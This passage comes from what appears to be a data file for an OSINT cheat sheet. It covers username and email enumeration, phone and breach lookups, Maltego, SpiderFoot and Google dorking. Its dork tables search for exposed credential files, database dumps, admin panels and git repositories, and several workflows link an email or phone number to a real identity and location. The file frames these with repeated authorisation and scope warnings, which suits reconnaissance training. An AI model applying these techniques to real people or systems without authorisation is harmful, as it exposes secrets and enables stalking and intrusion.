        brief: "WhatsMyName is a username enumeration project built around one principle: every site definition is validated, so a positive result means something. It maintains a JSON list of sites with explicit detection strings rather than relying on status codes alone, which cuts the false-positive rate that plagues broader tools.\n\nIt runs as a web app with no install, and the same wmn-data.json backs integrations in Recon-ng, SpiderFoot, and several CLI wrappers.",
        quickReference: [
          { label: "Web interface", cmd: "whatsmyname.app — enter a username, no account needed" },
          { label: "Raw site definitions", cmd: "github.com/WebBreacher/WhatsMyName -> wmn-data.json" },
          { label: "CLI wrapper", cmd: "pip install whatsmyname && whatsmyname -u johndoe" },
          { label: "Filter by category", cmd: "Use the category selector to search only coding, social, or gaming sites" }
        ],
        sections: [
          {
            title: "How Detection Works",
            type: "table",
            columns: ["Field in wmn-data.json", "Purpose"],
            rows: [
              ["uri_check", "The URL template the username is substituted into"],
              ["e_string", "String that must be present for the account to exist"],
              ["e_code", "HTTP status code expected on an existing account"],
              ["m_string", "String that indicates the account does NOT exist"],
              ["m_code", "Status code returned when the username is unclaimed"],
              ["Why both", "Requiring a positive AND ruling out a negative is what keeps false positives low"],
              ["known accounts", "Each definition ships with a known-good and known-bad username used to validate it"]
            ]
          },
          {
            title: "Categories",
            type: "table",
            columns: ["Category", "Examples of what it covers"],
            rows: [
              ["social", "Mainstream social networks and microblogging"],
              ["coding", "GitHub, GitLab, package registries, developer communities"],
              ["gaming", "Game platforms, launchers, and community sites"],
              ["business", "Professional networks and company review sites"],
              ["finance", "Payment handles, crypto services, crowdfunding"],
              ["health / political / dating", "Sensitive categories — collect these only with explicit scope justification"],
              ["images / video / music", "Media sharing and streaming platforms"],
              ["shopping / tech / misc", "Marketplaces, forums, and the long tail"]
            ]
          },
          {
            title: "Using the Data File",
            type: "table",
            columns: ["Use", "Description"],
            rows: [
              ["Direct download", "raw.githubusercontent.com/WebBreacher/WhatsMyName/main/wmn-data.json"],
              ["Custom scripting", "The schema is simple enough to drive your own checker in a few dozen lines"],
              ["SpiderFoot / Recon-ng", "Both consume this dataset as a module"],
              ["Filtering by category", "jq can subset the file to only the categories in your scope"],
              ["Contributing", "New site definitions are accepted by pull request and must include validation strings"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Quick check with no tooling", cmd: "1. Open whatsmyname.app\n2. Enter the username, select the relevant categories\n3. Export the hit list\n4. Open each hit and verify it is the same person" },
              { label: "Subset the data to your scope", cmd: "curl -s https://raw.githubusercontent.com/WebBreacher/WhatsMyName/main/wmn-data.json \\\n  | jq '[.sites[] | select(.cat==\"coding\" or .cat==\"social\")]' > scoped_sites.json" },
              { label: "Use it as a false-positive filter", cmd: "# run Sherlock or Maigret for breadth, then re-check the hits here\n# a site that appears in both with a validated string is a much stronger result" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "This is the accuracy-first option. Fewer sites than Maigret, but a positive result is far more trustworthy.",
              "Category filtering is an ethics control as much as a convenience — restricting to relevant categories keeps you from collecting health or dating data you have no business holding.",
              "The site list is community-maintained and updated frequently. Pull a fresh wmn-data.json before an engagement rather than relying on a cached copy.",
              "Because the format is documented and simple, it is the easiest dataset to build custom, scope-limited tooling around."
            ]
          }
        ]
      },
      {
        id: "holehe",
        name: "Holehe",
        url: "https://github.com/megadose/holehe",
        description: "Checks which of 120+ websites an email address is registered on.",
        brief: "Holehe takes an email address and, for each supported site, uses the password-reset or registration flow to determine whether an account exists — without sending the target any notification.\n\nIt answers a question no breach database can: which services is this address registered with right now. That maps a person's online footprint, and doubles as a check on which third-party services an organisation's staff actually use.",
        quickReference: [
          { label: "Check an address everywhere", cmd: "holehe target@example.com" },
          { label: "Show only sites where it is registered", cmd: "holehe target@example.com --only-used" },
          { label: "Write results to CSV", cmd: "holehe target@example.com --csv" },
          { label: "Use inside Python", cmd: "from holehe.modules.social_media.instagram import instagram" }
        ],
        sections: [
          {
            title: "Options",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["--only-used", "Print only the sites where the address is registered"],
              ["--csv", "Write a CSV of the results"],
              ["--no-clear", "Do not clear the terminal before output"],
              ["--timeout <s>", "Per-request timeout"],
              ["-C", "Shorthand for CSV output in recent versions"]
            ]
          },
          {
            title: "Result Meanings",
            type: "table",
            columns: ["Marker", "Meaning"],
            rows: [
              ["[+] site", "An account exists for this address on that site"],
              ["[-] site", "No account found"],
              ["[x] site", "The check failed — rate limit, captcha, or the site changed its flow"],
              ["Rate limit clusters", "Several [x] results in a row usually means your IP is being throttled, not that the accounts are absent"],
              ["Additional data", "Some modules return extras such as whether the account has a phone number attached or when it was created"]
            ]
          },
          {
            title: "How It Works",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Registration-flow probing", "Submits the address to a signup or reset endpoint and reads whether the site says it is already taken"],
              ["No notification sent", "Modules are chosen specifically to avoid triggering an email to the account holder"],
              ["Why sites break", "Any change to a login or reset flow breaks that module until it is updated"],
              ["Coverage", "Around 120 modules spanning social, shopping, email, and productivity services"],
              ["Related tools", "Same author's ignorant does the equivalent for phone numbers"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Footprint a single address", cmd: "holehe target@example.com --only-used --csv\n# every hit is a service to look at for a public profile" },
              { label: "Combine with breach data", cmd: "# 1. holehe -> which services the address is registered on today\n# 2. HaveIBeenPwned -> which of those have been breached\n# together these frame the credential-exposure picture" },
              { label: "Pivot from address to usernames", cmd: "holehe target@example.com --only-used\n# for each hit, look up the public profile and note the handle\nsherlock <handle_found> --print-found" },
              { label: "Assess an organisation's SaaS shadow IT", cmd: "# with authorisation, run staff addresses and aggregate the hits\nfor a in $(cat staff_emails.txt); do holehe \"$a\" --only-used; done | tee saas_footprint.txt" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Run from a residential or proxied IP for best results; datacentre ranges get captcha'd on many of the modules.",
              "Modules break constantly as sites change their flows. Update before use and treat [x] as unknown rather than negative.",
              "This is unusually personal data. Only run it inside an authorised scope, and delete results when the engagement ends.",
              "Pairs naturally with holehe's sibling ignorant for phone numbers and with Epieos for Google-account specifics."
            ]
          }
        ]
      },
      {
        id: "epieos",
        name: "Epieos",
        url: "https://epieos.com/",
        description: "Reverse email and phone lookup that surfaces Google and platform account data.",
        brief: "Epieos takes an email address or phone number and returns what it is linked to across services — most notably Google account details, which can include the display name, profile photo, associated Google Maps reviews, and calendar visibility.\n\nThe Google angle is what makes it distinct. A Gmail address often exposes a real name and a public review history, which turns an anonymous address into an identifiable person faster than any other single lookup.",
        quickReference: [
          { label: "Email lookup", cmd: "epieos.com — enter the address" },
          { label: "Phone lookup", cmd: "epieos.com — enter the number in E.164 format (+911234567890)" },
          { label: "Google-specific tool", cmd: "tools.epieos.com/google.php" },
          { label: "Holehe integration", cmd: "The site runs holehe modules alongside its own checks" }
        ],
        sections: [
          {
            title: "What Email Lookup Returns",
            type: "table",
            columns: ["Data point", "Notes"],
            rows: [
              ["Google account status", "Whether the address is a Google account and its internal Gaia ID"],
              ["Display name & photo", "Often the person's real name — the highest-value single field here"],
              ["Google Maps reviews", "Public review history, which frequently reveals home area, workplace, and habits"],
              ["Calendar visibility", "If a public calendar exists, its events may be readable"],
              ["Registered services", "Holehe-style registration checks across other platforms"],
              ["Linked social accounts", "Where a platform exposes the association publicly"]
            ]
          },
          {
            title: "What Phone Lookup Returns",
            type: "table",
            columns: ["Data point", "Notes"],
            rows: [
              ["Carrier & line type", "Mobile, landline, or VoIP — VoIP is a strong signal of a burner"],
              ["Country and region", "Derived from the number plan, not from device location"],
              ["Messaging app presence", "Whether the number is registered on common messaging platforms"],
              ["Associated display names", "Where a platform exposes a public profile name for the number"],
              ["Format validation", "Confirms the number is structurally valid before you act on it"]
            ]
          },
          {
            title: "The Gaia ID Pivot",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["What it is", "Google's internal, permanent identifier for an account"],
              ["Why it matters", "It stays constant even when the display name or email alias changes"],
              ["Maps reviews", "Reviews are tied to the Gaia ID and are public by default — a location trail most people forget exists"],
              ["Cross-checking", "The same Gaia ID appearing across services confirms one owner behind different display names"],
              ["Limitation", "Google periodically tightens what is exposed; results vary over time"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Address to identity", cmd: "1. Run the address through Epieos\n2. Note the Google display name and photo\n3. Open the Maps review history for location and interest signals\n4. Search the display name and photo against social platforms" },
              { label: "Verify a Hunter.io guess", cmd: "# Hunter.io predicts firstname.lastname@example.com\n# Epieos confirms whether that address is a live Google Workspace account\n# and often returns the display name, closing the loop" },
              { label: "Phone triage before further work", cmd: "1. Epieos phone lookup for carrier and line type\n2. If VoIP, expect a burner and lower your confidence accordingly\n3. Cross-check with PhoneInfoga for reputation and web mentions" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "The free tier is limited and the deeper modules sit behind a paid plan. Free lookups are usually enough to confirm a Google account and a display name.",
              "Google Maps review history is the most commonly overlooked exposure in this whole category — people do not realise those reviews are public and geolocated.",
              "This returns data about a real, identifiable person. Justify each lookup against your scope, and do not collect what you do not need.",
              "Results shift as Google changes its privacy defaults. An empty result today does not mean the account does not exist."
            ]
          }
        ]
      },
      {
        id: "phoneinfoga",
        name: "PhoneInfoga",
        url: "https://github.com/sundowndev/phoneinfoga",
        description: "Phone number reconnaissance — carrier, line type, reputation, and footprint.",
        brief: "PhoneInfoga scans an international phone number and gathers what is publicly known about it: country and carrier from the numbering plan, line type, reputation from scanner services, and web footprint via generated search-engine queries.\n\nIt is a framework rather than a database — much of its value is in the dork generation, which turns a number into a set of targeted searches across social platforms, directories, and document repositories.",
        quickReference: [
          { label: "Scan a number", cmd: "phoneinfoga scan -n \"+911234567890\"" },
          { label: "Launch the web UI", cmd: "phoneinfoga serve -p 8080" },
          { label: "Run only specific scanners", cmd: "phoneinfoga scan -n \"+911234567890\" -s local,numverify" },
          { label: "List available scanners", cmd: "phoneinfoga scanners" },
          { label: "JSON output", cmd: "phoneinfoga scan -n \"+911234567890\" --json" }
        ],
        sections: [
          {
            title: "Scanners",
            type: "table",
            columns: ["Scanner", "What it provides"],
            rows: [
              ["local", "Offline parsing — country, area, carrier hint, and line type from the numbering plan"],
              ["numverify", "Carrier and line-type validation via the Numverify API (free key)"],
              ["googlesearch", "Generates targeted dorks across social networks, directories, and document sites"],
              ["ovh", "Checks whether the number belongs to an OVH telecom range"],
              ["Custom scanners", "The plugin interface accepts your own scanner implementations"]
            ]
          },
          {
            title: "Number Formats",
            type: "table",
            columns: ["Format", "Notes"],
            rows: [
              ["E.164", "+911234567890 — always use this; it is unambiguous and every scanner accepts it"],
              ["International", "+91 12345 67890 — accepted, spacing is normalised"],
              ["National", "01234 567890 — ambiguous without a country, avoid"],
              ["Why it matters", "The local scanner derives everything from the country code; a wrong prefix invalidates the whole scan"]
            ]
          },
          {
            title: "Output Fields",
            type: "table",
            columns: ["Field", "Meaning"],
            rows: [
              ["Country / area", "Derived from the numbering plan, not from where the phone currently is"],
              ["Carrier", "Original carrier of the range; portability means it may no longer be accurate"],
              ["Line type", "Mobile, fixed line, VoIP, or toll-free — VoIP strongly suggests a temporary number"],
              ["Valid", "Whether the number is structurally possible in its plan, not whether it is in service"],
              ["Generated dorks", "Search URLs to run manually — this is where most real findings come from"]
            ]
          },
          {
            title: "Manual Dork Patterns",
            type: "table",
            columns: ["Query", "Purpose"],
            rows: [
              ["\"+911234567890\"", "Exact-match the full number anywhere on the web"],
              ["\"1234567890\" site:facebook.com", "Look for the number on a specific platform"],
              ["intext:\"1234 567890\"", "Catch alternative spacing conventions"],
              ["site:pastebin.com \"1234567890\"", "Look for it in leaked or pasted data"],
              ["filetype:pdf \"1234567890\"", "Find it in published documents such as invoices and directories"],
              ["Messaging apps", "Add the number to a contact list on a burner account to reveal a public profile photo — intrusive, use only with clear justification"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Standard scan", cmd: "phoneinfoga scan -n \"+911234567890\"\n# note the line type first — VoIP changes how you interpret everything else" },
              { label: "Run the web UI for interactive work", cmd: "docker run --rm -it -p 8080:8080 sundowndev/phoneinfoga serve -p 8080\n# open http://localhost:8080" },
              { label: "Follow the dorks manually", cmd: "phoneinfoga scan -n \"+911234567890\" -s googlesearch\n# open each generated URL — the tool does not execute them for you" },
              { label: "Cross-reference with other identifiers", cmd: "# a number found alongside an email:\nholehe target@example.com --only-used\nepieos.com phone lookup\n# consistent results across all three is what makes attribution defensible" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Carrier data reflects the number range, not the current operator. Number portability makes carrier attribution unreliable on its own.",
              "The generated dorks are the real output. Running the scan without following them up leaves most of the value on the table.",
              "A VoIP line type is a meaningful finding — it usually indicates a disposable number and lowers confidence in any identity linkage.",
              "Phone-number research is personal data handling in most jurisdictions. Keep it scoped, documented, and deleted at the end of the engagement."
            ]
          }
        ]
      },
      {
        id: "haveibeenpwned",
        name: "Have I Been Pwned",
        url: "https://haveibeenpwned.com/",
        description: "Checks whether an address, domain, or password appears in known data breaches.",
        brief: "Have I Been Pwned aggregates data from publicly known breaches and lets you check whether an email address, a whole domain, or a specific password appears in them. It is the reference source for breach exposure — authoritative, ethically run, and the one everyone else's tooling cites.\n\nFor an organisation, the domain search is the important feature: it lists every breached address on a domain you control and prove ownership of, which is the fastest way to size credential-stuffing risk.",
        quickReference: [
          { label: "Check one address", cmd: "haveibeenpwned.com — enter the address" },
          { label: "Check a password safely", cmd: "haveibeenpwned.com/Passwords — uses k-anonymity, the password never leaves your browser intact" },
          { label: "API breach lookup", cmd: "curl -H \"hibp-api-key: <key>\" https://haveibeenpwned.com/api/v3/breachedaccount/user@example.com" },
          { label: "Password range API — free, no key", cmd: "curl https://api.pwnedpasswords.com/range/<first5-of-sha1>" },
          { label: "Domain-wide report", cmd: "haveibeenpwned.com/DomainSearch — requires domain ownership verification" }
        ],
        sections: [
          {
            title: "API Endpoints",
            type: "table",
            columns: ["Endpoint", "Returns"],
            rows: [
              ["/api/v3/breachedaccount/<email>", "Breaches containing that address; add ?truncateResponse=false for full detail"],
              ["/api/v3/pasteaccount/<email>", "Pastes (Pastebin and similar) containing the address"],
              ["/api/v3/breaches", "Every breach in the system, with dates and compromised data classes"],
              ["/api/v3/breach/<name>", "Detail on a single named breach"],
              ["/api/v3/breacheddomain/<domain>", "All breached addresses on a verified domain"],
              ["api.pwnedpasswords.com/range/<prefix>", "Password hash suffixes and counts — free and unauthenticated"]
            ]
          },
          {
            title: "The k-Anonymity Model",
            type: "table",
            columns: ["Step", "What happens"],
            rows: [
              ["1. Hash locally", "SHA-1 the password on your machine"],
              ["2. Send 5 characters", "Only the first 5 hex characters of the hash are sent to the API"],
              ["3. Receive a bucket", "The API returns every hash suffix sharing that prefix, typically several hundred"],
              ["4. Match locally", "You compare the remaining suffix yourself"],
              ["Result", "HIBP never learns the password or even the full hash — safe to use in automated checks"]
            ]
          },
          {
            title: "Reading a Breach Record",
            type: "table",
            columns: ["Field", "Why it matters"],
            rows: [
              ["BreachDate", "When the breach occurred — a password changed after this date is not exposed by it"],
              ["AddedDate", "When HIBP published it; the gap from BreachDate is often years"],
              ["DataClasses", "Exactly what was exposed — passwords, addresses, security questions, payment data"],
              ["IsVerified", "Whether HIBP confirmed the data's authenticity; unverified entries need caution"],
              ["IsSensitive", "Sensitive breaches are excluded from public search and only shown to verified owners"],
              ["PwnCount", "Scale of the breach, useful context for a report"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Check a password without exposing it", cmd: "PASS='hunter2'\nHASH=$(printf '%s' \"$PASS\" | sha1sum | tr 'a-z' 'A-Z' | cut -d' ' -f1)\ncurl -s \"https://api.pwnedpasswords.com/range/${HASH:0:5}\" \\\n  | grep -i \"${HASH:5}\"\n# a match shows how many times it has appeared in breaches" },
              { label: "Assess exposure for a domain you own", cmd: "# verify the domain in the HIBP portal, then:\ncurl -s -H \"hibp-api-key: $HIBP_KEY\" \\\n  https://haveibeenpwned.com/api/v3/breacheddomain/example.com | jq" },
              { label: "Check a list of addresses", cmd: "for e in $(cat emails.txt); do\n  curl -s -H \"hibp-api-key: $HIBP_KEY\" \\\n    \"https://haveibeenpwned.com/api/v3/breachedaccount/$e\" \\\n    | jq -r --arg e \"$e\" '.[]? | \"\\($e) \\(.Name)\"'\n  sleep 2   # respect the rate limit\ndone" },
              { label: "Build the exposure picture", cmd: "# 1. HIBP -> which breaches include the address\n# 2. holehe -> which services it is registered on now\n# 3. overlap between the two is where credential stuffing actually lands" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "The email search API requires a paid key; the password range API is free and unauthenticated, which is usually the part you want to automate.",
              "HIBP tells you an address appeared in a breach, never the password itself. Anyone offering that is selling stolen credentials — do not go there.",
              "Compare BreachDate against the last known password change before calling an account exposed. Old breaches are often already remediated.",
              "Domain search needs verified ownership. That is a feature, not an obstacle — it is what keeps the tool ethical.",
              "Respect the documented rate limit. Hammering the API gets your key revoked and is discourteous to a free public service."
            ]
          }
        ]
      },
      {
        id: "maltego",
        name: "Maltego",
        url: "https://www.maltego.com/",
        description: "Link analysis platform that turns OSINT findings into a visual entity graph.",
        brief: "Maltego is a graph-based link analysis tool. You place an entity on a canvas — a domain, person, email, IP — and run transforms that query data sources and draw the results as connected nodes. Repeat, and relationships that were invisible in a list of text findings become obvious in the graph.\n\nIts real strength is not collection but comprehension. When an investigation spans dozens of domains, people, and addresses, the graph is what shows you which node everything actually hinges on.",
        quickReference: [
          { label: "Start an investigation", cmd: "New graph -> drag an entity onto the canvas -> right-click -> run a transform" },
          { label: "Run every transform in a set", cmd: "Right-click entity -> Transform Set -> All Transforms" },
          { label: "Community edition limit", cmd: "12 results per transform, non-commercial use" },
          { label: "Add data sources", cmd: "Transform Hub -> install a hub item and enter its API key" },
          { label: "Export findings", cmd: "Export graph as image, or entities as CSV for a report" }
        ],
        sections: [
          {
            title: "Entity Types",
            type: "table",
            columns: ["Entity", "Typical use"],
            rows: [
              ["Domain", "Starting point for infrastructure investigations"],
              ["DNS Name", "Individual hostnames discovered during enumeration"],
              ["IP Address / Netblock / AS", "Infrastructure layer of the graph"],
              ["Email Address", "Bridge between the infrastructure and people halves of a graph"],
              ["Person / Alias", "Named individuals and their handles"],
              ["Phone Number", "Links people to registrations and directories"],
              ["Organisation / Company", "Anchors corporate structure and WHOIS pivots"],
              ["Document / URL", "Files and pages, often the source of metadata pivots"],
              ["Custom entities", "Define your own types for case-specific data"]
            ]
          },
          {
            title: "Transforms",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["What a transform is", "A query that takes one entity and returns related entities from a data source"],
              ["Standard transforms", "DNS, WHOIS, and search-based transforms included by default"],
              ["Transform Hub", "Marketplace of third-party transform sets — Shodan, VirusTotal, HIBP, Censys, and many more"],
              ["Local transforms", "Scripts you write yourself, run on your machine against your own data"],
              ["Machines", "Saved sequences of transforms that run automatically — the closest thing to a playbook"],
              ["Transform limits", "Community edition caps results per transform; commercial tiers raise or remove that"]
            ]
          },
          {
            title: "Useful Hub Items",
            type: "table",
            columns: ["Hub item", "What it adds"],
            rows: [
              ["Shodan", "Exposed services and banners for IP entities"],
              ["VirusTotal", "Passive DNS, related samples, and reputation data"],
              ["Have I Been Pwned", "Breach exposure for email entities"],
              ["Censys", "Certificate and host data"],
              ["Social Links / Pipl (commercial)", "People-focused enrichment; licensing varies"],
              ["OpenCTI / MISP", "Bridges the graph to threat-intelligence platforms"],
              ["WhoisXML", "Historical and reverse WHOIS at scale"]
            ]
          },
          {
            title: "Working With the Graph",
            type: "table",
            columns: ["Feature", "Description"],
            rows: [
              ["Layouts", "Block, hierarchical, circular, and organic — organic best reveals clusters"],
              ["Entity weight", "Transforms assign weights; heavier nodes are more strongly connected"],
              ["Bookmarks & notes", "Annotate nodes with findings so the graph is self-documenting"],
              ["Collections", "Groups of similar nodes collapse to keep large graphs readable"],
              ["Detail view", "Every property returned by a transform, per entity"],
              ["Graph merging", "Combine graphs from different phases of an investigation"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Domain-first infrastructure map", cmd: "1. Drop the Domain entity on the canvas\n2. Run: To DNS Names, To MX/NS records, To Website\n3. On the resulting DNS names: To IP Address\n4. On the IPs: To Netblock, To AS, then the Shodan transforms\n5. Switch to organic layout — the clusters are the separate hosting environments" },
              { label: "People-first investigation", cmd: "1. Drop the Person or Email Address entity\n2. Run HIBP transforms for breach exposure\n3. To Alias / To Social Media Profile for handles\n4. To Phone Number and To Website\n5. Follow each alias back out for cross-platform confirmation" },
              { label: "Import external tool output", cmd: "# Amass can export directly to a Maltego-compatible format\namass viz -maltego -d example.com -dir ./engagement\n# then import the file as entities and continue in the graph" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Community edition is free and genuinely usable for learning; the per-transform result cap is the main constraint.",
              "Run transforms deliberately rather than 'all transforms' on everything — an unfocused graph becomes unreadable within a few hops.",
              "Maltego is a visualisation and correlation layer, not a data source. Its output is only as good as the transforms and keys behind it.",
              "The graph is the deliverable clients remember. Lay it out and annotate it before exporting — a tidy graph explains an engagement better than pages of text.",
              "Keep one graph per engagement, and mind that transform queries send entity values to third-party APIs — that has scope and privacy implications."
            ]
          }
        ]
      },
      {
        id: "spiderfoot",
        name: "SpiderFoot",
        url: "https://github.com/smicallef/spiderfoot",
        description: "Automated OSINT engine that correlates 200+ data sources into one scan.",
        brief: "SpiderFoot automates the whole reconnaissance pipeline. You give it a seed target — domain, IP, email, name, phone, or username — and it runs 200+ modules that query public sources, resolve what they find, and feed those results back in as new targets, recursively, until the scope is exhausted.\n\nIt is the tool for breadth without manual effort. The web UI gives you a browsable, correlated result set, and its correlation rules flag the findings that actually matter rather than leaving you to read thousands of rows.",
        quickReference: [
          { label: "Start the web UI", cmd: "python3 ./sf.py -l 127.0.0.1:5001" },
          { label: "CLI scan with a module set", cmd: "python3 ./sf.py -s example.com -t DOMAIN_NAME -u footprint" },
          { label: "Passive-only scan", cmd: "python3 ./sf.py -s example.com -u passive" },
          { label: "List all modules", cmd: "python3 ./sf.py -M" },
          { label: "Run specific modules", cmd: "python3 ./sf.py -s example.com -m sfp_crt,sfp_dnsresolve,sfp_shodan" }
        ],
        sections: [
          {
            title: "Scan Use Cases",
            type: "table",
            columns: ["Use case", "What it runs"],
            rows: [
              ["all", "Every module — maximum coverage, longest runtime, noisiest"],
              ["footprint", "Map the target's externally visible network footprint"],
              ["investigate", "Focus on reputation and malicious-association checks"],
              ["passive", "Only modules that never touch the target directly — safe pre-authorisation"],
              ["Custom module set", "Hand-pick modules with -m for a precise, fast scan"]
            ]
          },
          {
            title: "Target Types",
            type: "table",
            columns: ["Type", "Example seed"],
            rows: [
              ["DOMAIN_NAME", "example.com"],
              ["INTERNET_NAME", "www.example.com"],
              ["IP_ADDRESS / NETBLOCK_OWNER", "1.2.3.4 or 1.2.3.0/24"],
              ["EMAILADDR", "user@example.com"],
              ["HUMAN_NAME", "\"John Doe\" — quoted"],
              ["USERNAME", "johndoe"],
              ["PHONE_NUMBER", "+911234567890"],
              ["BITCOIN_ADDRESS", "For cryptocurrency-linked investigations"],
              ["BGP_AS_OWNER", "An ASN number"]
            ]
          },
          {
            title: "Notable Modules",
            type: "table",
            columns: ["Module", "Purpose"],
            rows: [
              ["sfp_crt", "Certificate transparency subdomain discovery"],
              ["sfp_dnsresolve / sfp_dnsbrute", "Resolution and DNS brute forcing"],
              ["sfp_shodan / sfp_censys", "Exposed service data (API keys required)"],
              ["sfp_hunter / sfp_emailrep", "Email discovery and reputation"],
              ["sfp_haveibeenpwned", "Breach exposure for discovered addresses"],
              ["sfp_github", "Searches public repositories for target references and leaked keys"],
              ["sfp_pastesites", "Looks for the target in paste sites"],
              ["sfp_whatweb / sfp_webframework", "Technology fingerprinting on discovered web hosts"],
              ["sfp_tool_*", "Wrappers around local binaries — nmap, nbtscan, whatweb, dnstwist"],
              ["sfp_accounts", "Username enumeration across social platforms"]
            ]
          },
          {
            title: "Correlation Rules",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["What they do", "Post-scan rules that surface meaningful patterns from raw results"],
              ["Examples", "Hosts with expired certificates, cloud storage exposed publicly, credentials found in code, outdated software versions"],
              ["Why they matter", "A large scan produces tens of thousands of rows; correlations are the shortlist worth reading first"],
              ["Custom rules", "Defined in YAML under the correlations/ directory and easy to extend"],
              ["Viewing", "The Correlations tab of a completed scan in the web UI"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Passive footprinting before authorisation lands", cmd: "python3 ./sf.py -s example.com -t DOMAIN_NAME -u passive \\\n  -o csv > passive_scan.csv" },
              { label: "Full authorised footprint scan", cmd: "python3 ./sf.py -l 127.0.0.1:5001\n# in the UI: New Scan -> seed example.com -> use case 'footprint'\n# then read the Correlations tab before anything else" },
              { label: "Targeted, fast scan", cmd: "python3 ./sf.py -s example.com \\\n  -m sfp_crt,sfp_dnsresolve,sfp_hunter,sfp_haveibeenpwned,sfp_github \\\n  -o json > targeted.json" },
              { label: "Person-centric scan", cmd: "python3 ./sf.py -s \"John Doe\" -t HUMAN_NAME -u all\n# and separately on the username and email as distinct seeds" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Configure API keys in Settings before the first real scan — without them a large fraction of modules return nothing and the scan looks misleadingly empty.",
              "'all' with an unrestricted scope can wander far beyond what you are authorised to touch. Set scope limits deliberately in the scan settings.",
              "Read the Correlations tab first. Reading raw results top to bottom is how people burn hours on a SpiderFoot scan.",
              "Passive use case is genuinely passive and is the right default until you have written authorisation.",
              "Scan data is stored in a local SQLite database, so results persist and can be re-queried and compared between runs."
            ]
          }
        ]
      },
      {
        id: "google-dorking",
        name: "Google Dorking",
        url: "https://www.exploit-db.com/google-hacking-database",
        description: "Advanced search-engine operators for finding exposed files, panels, and data.",
        brief: "Google dorking is the practice of using advanced search operators to find things the search engine indexed but nobody intended to publish: configuration files, database backups, login panels, internal documents, and credentials in code.\n\nThere is no tool to install — the technique is the tool. It is entirely passive (you query Google, not the target) and remains one of the highest yield-per-effort activities in reconnaissance. The Google Hacking Database catalogues thousands of proven queries.",
        quickReference: [
          { label: "Everything indexed on a domain", cmd: "site:example.com" },
          { label: "Find exposed documents", cmd: "site:example.com filetype:pdf | filetype:xlsx | filetype:docx" },
          { label: "Find login pages", cmd: "site:example.com inurl:login | inurl:admin | inurl:signin" },
          { label: "Find subdomains via search", cmd: "site:*.example.com -site:www.example.com" },
          { label: "Directory listings", cmd: "site:example.com intitle:\"index of\"" }
        ],
        sections: [
          {
            title: "Core Operators",
            type: "table",
            columns: ["Operator", "Description"],
            rows: [
              ["site:", "Restrict results to a domain or subdomain"],
              ["inurl:", "The URL contains the term"],
              ["intitle:", "The page title contains the term"],
              ["intext:", "The page body contains the term"],
              ["filetype: / ext:", "Restrict to a file extension"],
              ["cache:", "Google's cached copy of a page"],
              ["related:", "Sites Google considers similar"],
              ["allinurl: / allintitle:", "All listed terms must appear in the URL or title"],
              ["-term", "Exclude results containing the term"],
              ["\"exact phrase\"", "Match the phrase exactly"],
              ["|  or  OR", "Boolean OR between terms"],
              ["*", "Wildcard for a single word"]
            ]
          },
          {
            title: "Exposed Files",
            type: "table",
            columns: ["Query", "What it finds"],
            rows: [
              ["site:example.com ext:sql | ext:db | ext:bak", "Database dumps and backup files"],
              ["site:example.com ext:log | ext:conf | ext:cnf | ext:ini", "Configuration and log files"],
              ["site:example.com ext:env | \"DB_PASSWORD\"", "Environment files containing credentials"],
              ["site:example.com filetype:xls | filetype:xlsx \"internal\"", "Spreadsheets not meant to be public"],
              ["site:example.com ext:txt inurl:robots", "robots.txt files, which often list paths meant to stay hidden"],
              ["site:example.com \"index of\" backup", "Open directories holding backups"],
              ["site:example.com ext:pdf \"confidential\"", "Documents marked confidential but publicly indexed"]
            ]
          },
          {
            title: "Panels & Infrastructure",
            type: "table",
            columns: ["Query", "What it finds"],
            rows: [
              ["site:example.com inurl:admin | inurl:administrator", "Administrative interfaces"],
              ["site:example.com intitle:\"phpMyAdmin\"", "Exposed database management panels"],
              ["site:example.com inurl:wp-admin | inurl:wp-content", "WordPress installations"],
              ["site:example.com intitle:\"Dashboard\" inurl:8080", "Management dashboards on alternate ports"],
              ["site:example.com inurl:jenkins | inurl:jira | inurl:gitlab", "Internal developer tooling reachable publicly"],
              ["site:example.com inurl:\"/api/\" | inurl:swagger | inurl:graphql", "API documentation and interactive explorers"],
              ["site:example.com intitle:\"index of\" \".git\"", "Exposed git repositories"]
            ]
          },
          {
            title: "People & Third-Party Sources",
            type: "table",
            columns: ["Query", "Purpose"],
            rows: [
              ["site:linkedin.com \"Example Corp\"", "Employee enumeration for org-structure mapping"],
              ["site:github.com \"example.com\"", "Code referencing the target's domain — often with endpoints or keys"],
              ["site:pastebin.com \"example.com\"", "Pasted data mentioning the target"],
              ["site:trello.com | site:docs.google.com \"example corp\"", "Publicly shared boards and documents"],
              ["site:s3.amazonaws.com \"example\"", "Public S3 buckets bearing the target's name"],
              ["\"@example.com\" -site:example.com", "Email addresses published on third-party sites"]
            ]
          },
          {
            title: "Other Search Engines",
            type: "table",
            columns: ["Engine", "Why use it"],
            rows: [
              ["Bing", "Supports ip: to find all sites on an IP — Google has no equivalent"],
              ["DuckDuckGo", "No personalisation and lighter rate limiting"],
              ["Yandex", "Distinct index; noticeably better for some regions and for image search"],
              ["Baidu", "The practical choice for Chinese-language targets"],
              ["GitHub code search", "Its own operators (org:, path:, language:) and the best source for leaked keys"],
              ["Grep.app / SearchCode", "Search across public code without GitHub's rate limits"]
            ]
          },
          {
